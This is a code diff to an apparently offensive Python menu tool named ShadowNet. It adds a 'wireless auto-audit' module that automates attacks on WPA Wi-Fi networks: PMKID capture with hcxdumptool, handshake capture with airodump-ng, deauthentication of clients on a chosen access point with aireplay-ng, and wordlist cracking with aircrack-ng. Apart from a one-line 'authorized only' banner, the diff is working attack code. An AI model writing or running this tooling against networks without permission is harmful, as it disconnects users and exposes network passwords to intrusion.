@@ -327,6 +327,7 @@ class ShadowNet:
 ║  [03] ACCESS POINT ANALYSIS       [07] DICTIONARY ATTACK                 ║
 ║  [04] DEAUTH OPERATIONS           [08] SYSTEM INFILTRATION               ║
 ║  [09] WORDLIST MANAGEMENT         [10] FILE OPERATIONS                   ║
+║  [11] WIRELESS AUTO-AUDIT (WIFITE-LIKE)                                  ║
 ║                                                                          ║
 ║  [99] EXIT SHADOWNET                                                     ║
 ║                                                                          ║
@@ -456,6 +457,116 @@ class ShadowNet:
         cmd = f"nmap -sn {target}"
         subprocess.run(cmd, shell=True)
         
+        input("\n[PRESS ENTER TO CONTINUE]")
+
+    def wireless_auto_audit(self):
+        print("\n[*] WIRELESS AUTO-AUDIT (WIFITE-LIKE)")
+        print("=" * 60)
+        print("[!] AUTHORIZED PENTESTING ONLY")
+        os_info = detect_os()
+        if os_info.get('system') != 'Linux':
+            print("[i] This module currently supports Linux.")
+            input("\n[PRESS ENTER TO CONTINUE]")
+            return
+
+        tools_required = ['hcxdumptool', 'hcxpcapngtool', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
+        missing = [t for t in tools_required if subprocess.call(['which', t], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0]
+        if missing:
+            print(f"[!] Missing tools: {', '.join(missing)}")
+            print("[!] Install via setup or package manager (apt install hcxdumptool hcxpcapngtool aircrack-ng)")
+            input("\n[PRESS ENTER TO CONTINUE]")
+            return
+
+        print("\nModes:")
+        print("  [1] PMKID attack (hcxdumptool)")
+        print("  [2] Handshake capture (airodump+deauth)")
+        print("  [3] Both (PMKID then handshake)")
+        mode = input("[+] Select mode: ")
+
+        iface = input("[+] Interface (monitor-capable, e.g., wlan0 or wlan0mon): ")
+        # Attempt to enable monitor mode if needed
+        if not iface.endswith('mon'):
+            _ = enable_monitor_mode_linux(iface)
+            # airmon-ng typically renames to <iface>mon; give user a chance to override
+            iface_mon = input("[?] Monitor interface name (ENTER to use original): ") or iface
+        else:
+            iface_mon = iface
+
+        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+        cap_dir = Path('captures')
+        cap_dir.mkdir(parents=True, exist_ok=True)
+
+        def run_pmkid(duration=60):
+            print(f"[*] Starting PMKID capture for {duration}s on {iface_mon}...")
+            pcap_path = cap_dir / f"pmkid_{ts}.pcapng"
+            try:
+                proc = subprocess.Popen(['sudo', 'hcxdumptool', '-i', iface_mon, '--enable_status=15', '-o', str(pcap_path)])
+                time.sleep(int(duration))
+                proc.terminate()
+            except KeyboardInterrupt:
+                proc.terminate()
+            print("[*] Converting to hash format (22000)...")
+            hash_path = cap_dir / f"pmkid_{ts}.22000"
+            subprocess.run(['hcxpcapngtool', str(pcap_path), '-o', str(hash_path)], check=False)
+            if hash_path.exists() and hash_path.stat().st_size > 0:
+                print(f"[+] PMKID hashes saved: {hash_path}")
+            else:
+                print("[!] No PMKID hashes found.")
+            return str(pcap_path), str(hash_path)
+
+        def run_handshake(bssid=None, channel=None, deauth=True, duration=90):
+            prefix = cap_dir / f"hs_{ts}"
+            airodump_cmd = ['sudo', 'airodump-ng']
+            if channel:
+                airodump_cmd += ['-c', str(channel)]
+            if bssid:
+                airodump_cmd += ['--bssid', bssid]
+            airodump_cmd += ['-w', str(prefix), iface_mon]
+            print(f"[*] Starting airodump-ng, writing to {prefix}-01.cap ...")
+            dump_proc = subprocess.Popen(airodump_cmd)
+            deauth_proc = None
+            try:
+                if deauth and bssid:
+                    print("[*] Sending periodic deauth to accelerate handshake capture...")
+                    deauth_proc = subprocess.Popen(['sudo', 'aireplay-ng', '-0', '10', '-a', bssid, iface_mon])
+                time.sleep(int(duration))
+            except KeyboardInterrupt:
+                pass
+            finally:
+                if deauth_proc and deauth_proc.poll() is None:
+                    deauth_proc.terminate()
+                if dump_proc and dump_proc.poll() is None:
+                    dump_proc.terminate()
+            cap_file = f"{prefix}-01.cap"
+            if Path(cap_file).exists():
+                print(f"[+] Capture saved: {cap_file}")
+                wl = input("[?] Wordlist path to try with aircrack-ng (ENTER to skip): ")
+                if wl:
+                    print("[*] Attempting crack with aircrack-ng...")
+                    subprocess.run(['aircrack-ng', '-w', wl, cap_file])
+            else:
+                print("[!] Handshake file not found. Try increasing duration or deauth.")
+            return cap_file
+
+        if mode == '1':
+            dur = input("[+] Duration seconds (60): ") or '60'
+            run_pmkid(dur)
+        elif mode == '2':
+            bssid = input("[+] Target BSSID (optional, ENTER to scan all): ") or None
+            channel = input("[+] Channel (optional): ") or None
+            deauth = input("[+] Send deauth? (Y/n): ").strip().lower() != 'n'
+            dur = input("[+] Duration seconds (90): ") or '90'
+            run_handshake(bssid=bssid, channel=channel, deauth=deauth, duration=dur)
+        elif mode == '3':
+            dur1 = input("[+] PMKID duration (60): ") or '60'
+            run_pmkid(dur1)
+            bssid = input("[+] Target BSSID for handshake (optional): ") or None
+            channel = input("[+] Channel (optional): ") or None
+            deauth = input("[+] Send deauth? (Y/n): ").strip().lower() != 'n'
+            dur2 = input("[+] Handshake duration (90): ") or '90'
+            run_handshake(bssid=bssid, channel=channel, deauth=deauth, duration=dur2)
+        else:
+            print("[!] Invalid selection")
         input("\n[PRESS ENTER TO CONTINUE]")
     
     def hidden_ssid_discovery(self):
@@ -1049,6 +1160,8 @@ class ShadowNet:
                 self.wordlist_management()
             elif choice == "10" or choice == "10":
                 self.file_operations()
+            elif choice == "11" or choice == "11":
+                self.wireless_auto_audit()
             elif choice == "99":
                 print("\n[*] SHADOWNET TERMINATED")
                 print("[*] OUT")
